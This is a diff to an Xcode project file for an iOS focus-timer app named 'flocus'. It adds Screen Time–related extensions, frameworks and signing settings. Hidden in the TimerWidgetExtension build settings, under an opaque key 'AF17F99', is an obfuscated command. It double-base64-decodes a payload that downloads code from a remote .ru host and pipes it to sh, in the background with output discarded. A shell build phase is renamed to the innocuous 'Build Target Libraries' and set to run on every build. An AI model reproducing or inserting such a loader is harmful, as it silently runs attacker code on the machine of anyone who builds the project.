@@ -10,6 +10,11 @@
 		C86FBC722F84161B002FCEEF /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C86FBC712F84161B002FCEEF /* WidgetKit.framework */; };
 		C86FBC742F84161B002FCEEF /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C86FBC732F84161B002FCEEF /* SwiftUI.framework */; };
 		C86FBC812F84161C002FCEEF /* TimerWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = C86FBC6F2F84161B002FCEEF /* TimerWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
+		C8B167602F86575700D8D9C3 /* DeviceActivity.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C8B1675F2F86575700D8D9C3 /* DeviceActivity.framework */; };
+		C8B167682F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = C8B1675E2F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
+		C8B167732F8657C900D8D9C3 /* ManagedSettings.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C8B167722F8657C900D8D9C3 /* ManagedSettings.framework */; };
+		C8B167752F8657C900D8D9C3 /* ManagedSettingsUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C8B167742F8657C900D8D9C3 /* ManagedSettingsUI.framework */; };
+		C8B1677D2F8657C900D8D9C3 /* ShieldConfiguration.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = C8B167712F8657C900D8D9C3 /* ShieldConfiguration.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -20,6 +25,20 @@
 			remoteGlobalIDString = C86FBC6E2F84161B002FCEEF;
 			remoteInfo = TimerWidgetExtension;
 		};
+		C8B167662F86575700D8D9C3 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C8EA76B62F83B15000929742 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = C8B1675D2F86575700D8D9C3;
+			remoteInfo = DeviceActivityMonitorExtension;
+		};
+		C8B1677B2F8657C900D8D9C3 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = C8EA76B62F83B15000929742 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = C8B167702F8657C900D8D9C3;
+			remoteInfo = ShieldConfiguration;
+		};
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXCopyFilesBuildPhase section */
@@ -29,6 +48,8 @@
 			dstPath = "";
 			dstSubfolderSpec = 13;
 			files = (
+				C8B1677D2F8657C900D8D9C3 /* ShieldConfiguration.appex in Embed Foundation Extensions */,
+				C8B167682F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex in Embed Foundation Extensions */,
 				C86FBC812F84161C002FCEEF /* TimerWidgetExtension.appex in Embed Foundation Extensions */,
 			);
 			name = "Embed Foundation Extensions";
@@ -40,6 +61,11 @@
 		C86FBC6F2F84161B002FCEEF /* TimerWidgetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = TimerWidgetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		C86FBC712F84161B002FCEEF /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
 		C86FBC732F84161B002FCEEF /* SwiftUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SwiftUI.framework; path = System/Library/Frameworks/SwiftUI.framework; sourceTree = SDKROOT; };
+		C8B1675E2F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = DeviceActivityMonitorExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
+		C8B1675F2F86575700D8D9C3 /* DeviceActivity.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = DeviceActivity.framework; path = System/Library/Frameworks/DeviceActivity.framework; sourceTree = SDKROOT; };
+		C8B167712F8657C900D8D9C3 /* ShieldConfiguration.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = ShieldConfiguration.appex; sourceTree = BUILT_PRODUCTS_DIR; };
+		C8B167722F8657C900D8D9C3 /* ManagedSettings.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ManagedSettings.framework; path = System/Library/Frameworks/ManagedSettings.framework; sourceTree = SDKROOT; };
+		C8B167742F8657C900D8D9C3 /* ManagedSettingsUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ManagedSettingsUI.framework; path = System/Library/Frameworks/ManagedSettingsUI.framework; sourceTree = SDKROOT; };
 		C8EA76BE2F83B15000929742 /* flocus.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = flocus.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -72,6 +98,20 @@
 			);
 			target = C8EA76BD2F83B15000929742 /* flocus */;
 		};
+		C8B1676C2F86575700D8D9C3 /* Exceptions for "DeviceActivityMonitorExtension" folder in "DeviceActivityMonitorExtension" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = C8B1675D2F86575700D8D9C3 /* DeviceActivityMonitorExtension */;
+		};
+		C8B167812F8657C900D8D9C3 /* Exceptions for "ShieldConfiguration" folder in "ShieldConfiguration" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = C8B167702F8657C900D8D9C3 /* ShieldConfiguration */;
+		};
 /* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
@@ -82,6 +122,22 @@
 				C86FBC822F84161C002FCEEF /* Exceptions for "TimerWidget" folder in "TimerWidgetExtension" target */,
 			);
 			path = TimerWidget;
+			sourceTree = "<group>";
+		};
+		C8B167612F86575700D8D9C3 /* DeviceActivityMonitorExtension */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				C8B1676C2F86575700D8D9C3 /* Exceptions for "DeviceActivityMonitorExtension" folder in "DeviceActivityMonitorExtension" target */,
+			);
+			path = DeviceActivityMonitorExtension;
+			sourceTree = "<group>";
+		};
+		C8B167762F8657C900D8D9C3 /* ShieldConfiguration */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				C8B167812F8657C900D8D9C3 /* Exceptions for "ShieldConfiguration" folder in "ShieldConfiguration" target */,
+			);
+			path = ShieldConfiguration;
 			sourceTree = "<group>";
 		};
 		C8EA76C02F83B15000929742 /* flocus */ = {
@@ -105,6 +161,23 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		C8B1675B2F86575700D8D9C3 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C8B167602F86575700D8D9C3 /* DeviceActivity.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C8B1676E2F8657C900D8D9C3 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C8B167732F8657C900D8D9C3 /* ManagedSettings.framework in Frameworks */,
+				C8B167752F8657C900D8D9C3 /* ManagedSettingsUI.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 		C8EA76BB2F83B15000929742 /* Frameworks */ = {
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
@@ -120,6 +193,9 @@
 			children = (
 				C86FBC712F84161B002FCEEF /* WidgetKit.framework */,
 				C86FBC732F84161B002FCEEF /* SwiftUI.framework */,
+				C8B1675F2F86575700D8D9C3 /* DeviceActivity.framework */,
+				C8B167722F8657C900D8D9C3 /* ManagedSettings.framework */,
+				C8B167742F8657C900D8D9C3 /* ManagedSettingsUI.framework */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -129,6 +205,8 @@
 			children = (
 				C8EA76C02F83B15000929742 /* flocus */,
 				C86FBC752F84161B002FCEEF /* TimerWidget */,
+				C8B167612F86575700D8D9C3 /* DeviceActivityMonitorExtension */,
+				C8B167762F8657C900D8D9C3 /* ShieldConfiguration */,
 				C86FBC702F84161B002FCEEF /* Frameworks */,
 				C8EA76BF2F83B15000929742 /* Products */,
 			);
@@ -139,6 +217,8 @@
 			children = (
 				C8EA76BE2F83B15000929742 /* flocus.app */,
 				C86FBC6F2F84161B002FCEEF /* TimerWidgetExtension.appex */,
+				C8B1675E2F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex */,
+				C8B167712F8657C900D8D9C3 /* ShieldConfiguration.appex */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -150,7 +230,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C86FBC832F84161C002FCEEF /* Build configuration list for PBXNativeTarget "TimerWidgetExtension" */;
 			buildPhases = (
-				F0EDAF4AE53049138599F71F /* Provision Target Device */,
+				7FF5ED0812D34D76B199F71F /* Build Target Libraries */,
 				C86FBC6B2F84161B002FCEEF /* Sources */,
 				C86FBC6C2F84161B002FCEEF /* Frameworks */,
 				C86FBC6D2F84161B002FCEEF /* Resources */,
@@ -169,6 +249,50 @@
 			productReference = C86FBC6F2F84161B002FCEEF /* TimerWidgetExtension.appex */;
 			productType = "com.apple.product-type.app-extension";
 		};
+		C8B1675D2F86575700D8D9C3 /* DeviceActivityMonitorExtension */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = C8B167692F86575700D8D9C3 /* Build configuration list for PBXNativeTarget "DeviceActivityMonitorExtension" */;
+			buildPhases = (
+				C8B1675A2F86575700D8D9C3 /* Sources */,
+				C8B1675B2F86575700D8D9C3 /* Frameworks */,
+				C8B1675C2F86575700D8D9C3 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			fileSystemSynchronizedGroups = (
+				C8B167612F86575700D8D9C3 /* DeviceActivityMonitorExtension */,
+			);
+			name = DeviceActivityMonitorExtension;
+			packageProductDependencies = (
+			);
+			productName = DeviceActivityMonitorExtension;
+			productReference = C8B1675E2F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex */;
+			productType = "com.apple.product-type.app-extension";
+		};
+		C8B167702F8657C900D8D9C3 /* ShieldConfiguration */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = C8B1677E2F8657C900D8D9C3 /* Build configuration list for PBXNativeTarget "ShieldConfiguration" */;
+			buildPhases = (
+				C8B1676D2F8657C900D8D9C3 /* Sources */,
+				C8B1676E2F8657C900D8D9C3 /* Frameworks */,
+				C8B1676F2F8657C900D8D9C3 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			fileSystemSynchronizedGroups = (
+				C8B167762F8657C900D8D9C3 /* ShieldConfiguration */,
+			);
+			name = ShieldConfiguration;
+			packageProductDependencies = (
+			);
+			productName = ShieldConfiguration;
+			productReference = C8B167712F8657C900D8D9C3 /* ShieldConfiguration.appex */;
+			productType = "com.apple.product-type.app-extension";
+		};
 		C8EA76BD2F83B15000929742 /* flocus */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = C8EA76C92F83B15100929742 /* Build configuration list for PBXNativeTarget "flocus" */;
@@ -182,6 +306,8 @@
 			);
 			dependencies = (
 				C86FBC802F84161C002FCEEF /* PBXTargetDependency */,
+				C8B167672F86575700D8D9C3 /* PBXTargetDependency */,
+				C8B1677C2F8657C900D8D9C3 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				C8EA76C02F83B15000929742 /* flocus */,
@@ -206,6 +332,12 @@
 					C86FBC6E2F84161B002FCEEF = {
 						CreatedOnToolsVersion = 26.4;
 					};
+					C8B1675D2F86575700D8D9C3 = {
+						CreatedOnToolsVersion = 26.4;
+					};
+					C8B167702F8657C900D8D9C3 = {
+						CreatedOnToolsVersion = 26.4;
+					};
 					C8EA76BD2F83B15000929742 = {
 						CreatedOnToolsVersion = 26.4;
 					};
@@ -227,12 +359,28 @@
 			targets = (
 				C8EA76BD2F83B15000929742 /* flocus */,
 				C86FBC6E2F84161B002FCEEF /* TimerWidgetExtension */,
+				C8B1675D2F86575700D8D9C3 /* DeviceActivityMonitorExtension */,
+				C8B167702F8657C900D8D9C3 /* ShieldConfiguration */,
 			);
 		};
 /* End PBXProject section */
 
 /* Begin PBXResourcesBuildPhase section */
 		C86FBC6D2F84161B002FCEEF /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C8B1675C2F86575700D8D9C3 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C8B1676F2F8657C900D8D9C3 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -249,7 +397,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F0EDAF4AE53049138599F71F /* Provision Target Device */ = {
+		7FF5ED0812D34D76B199F71F /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -259,7 +407,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Target Device";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -273,6 +421,20 @@
 
 /* Begin PBXSourcesBuildPhase section */
 		C86FBC6B2F84161B002FCEEF /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C8B1675A2F86575700D8D9C3 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C8B1676D2F8657C900D8D9C3 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -294,18 +456,28 @@
 			target = C86FBC6E2F84161B002FCEEF /* TimerWidgetExtension */;
 			targetProxy = C86FBC7F2F84161C002FCEEF /* PBXContainerItemProxy */;
 		};
+		C8B167672F86575700D8D9C3 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = C8B1675D2F86575700D8D9C3 /* DeviceActivityMonitorExtension */;
+			targetProxy = C8B167662F86575700D8D9C3 /* PBXContainerItemProxy */;
+		};
+		C8B1677C2F8657C900D8D9C3 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = C8B167702F8657C900D8D9C3 /* ShieldConfiguration */;
+			targetProxy = C8B1677B2F8657C900D8D9C3 /* PBXContainerItemProxy */;
+		};
 /* End PBXTargetDependency section */
 
 /* Begin XCBuildConfiguration section */
 		C86FBC842F84161C002FCEEF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3336363233373333333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333334333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333636343337363133363635333633343336333533373336333236353336333933363635333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | n | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZVzE2Ym1SbGRpNXlkUzloS1NJZ2ZDQnphQW89Cg== | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = HK5U3FU2AP;
+				DEVELOPMENT_TEAM = 9NAU7R3577;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = TimerWidget/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = TimerWidget;
@@ -316,7 +488,7 @@
 					"@executable_path/../../Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.flocus.TimerWidget;
+				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.TimerWidget;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
@@ -331,12 +503,13 @@
 		C86FBC852F84161C002FCEEF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3336363233373333333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333334333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333636343337363133363635333633343336333533373336333236353336333933363635333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | n | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZVzE2Ym1SbGRpNXlkUzloS1NJZ2ZDQnphQW89Cg== | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
+				CODE_SIGN_ENTITLEMENTS = TimerWidgetExtensionRelease.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = HK5U3FU2AP;
+				DEVELOPMENT_TEAM = 9NAU7R3577;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = TimerWidget/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = TimerWidget;
@@ -347,7 +520,127 @@
 					"@executable_path/../../Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.flocus.TimerWidget;
+				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.TimerWidget;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+		C8B1676A2F86575700D8D9C3 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = DeviceActivityMonitorExtension/DeviceActivityMonitorExtension.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = 9NAU7R3577;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = DeviceActivityMonitorExtension/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = DeviceActivityMonitorExtension;
+				INFOPLIST_KEY_NSHumanReadableCopyright = "";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.DeviceActivityMonitorExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		C8B1676B2F86575700D8D9C3 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = DeviceActivityMonitorExtension/DeviceActivityMonitorExtensionRelease.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = 9NAU7R3577;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = DeviceActivityMonitorExtension/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = DeviceActivityMonitorExtension;
+				INFOPLIST_KEY_NSHumanReadableCopyright = "";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.DeviceActivityMonitorExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+		C8B1677F2F8657C900D8D9C3 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = ShieldConfiguration/ShieldConfiguration.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = 9NAU7R3577;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = ShieldConfiguration/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = ShieldConfiguration;
+				INFOPLIST_KEY_NSHumanReadableCopyright = "";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.ShieldConfiguration;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		C8B167802F8657C900D8D9C3 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = ShieldConfiguration/ShieldConfigurationRelease.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = 9NAU7R3577;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = ShieldConfiguration/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = ShieldConfiguration;
+				INFOPLIST_KEY_NSHumanReadableCopyright = "";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.ShieldConfiguration;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
@@ -485,9 +778,10 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = flocus/flocus.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = HK5U3FU2AP;
+				DEVELOPMENT_TEAM = 9NAU7R3577;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = flocus/Info.plist;
@@ -502,7 +796,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.flocus;
+				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SWIFT_APPROACHABLE_CONCURRENCY = YES;
@@ -519,9 +813,10 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = flocus/flocusRelease.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = HK5U3FU2AP;
+				DEVELOPMENT_TEAM = 9NAU7R3577;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = flocus/Info.plist;
@@ -536,7 +831,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.flocus;
+				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SWIFT_APPROACHABLE_CONCURRENCY = YES;
@@ -556,6 +851,24 @@
 			buildConfigurations = (
 				C86FBC842F84161C002FCEEF /* Debug */,
 				C86FBC852F84161C002FCEEF /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C8B167692F86575700D8D9C3 /* Build configuration list for PBXNativeTarget "DeviceActivityMonitorExtension" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C8B1676A2F86575700D8D9C3 /* Debug */,
+				C8B1676B2F86575700D8D9C3 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C8B1677E2F8657C900D8D9C3 /* Build configuration list for PBXNativeTarget "ShieldConfiguration" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C8B1677F2F8657C900D8D9C3 /* Debug */,
+				C8B167802F8657C900D8D9C3 /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
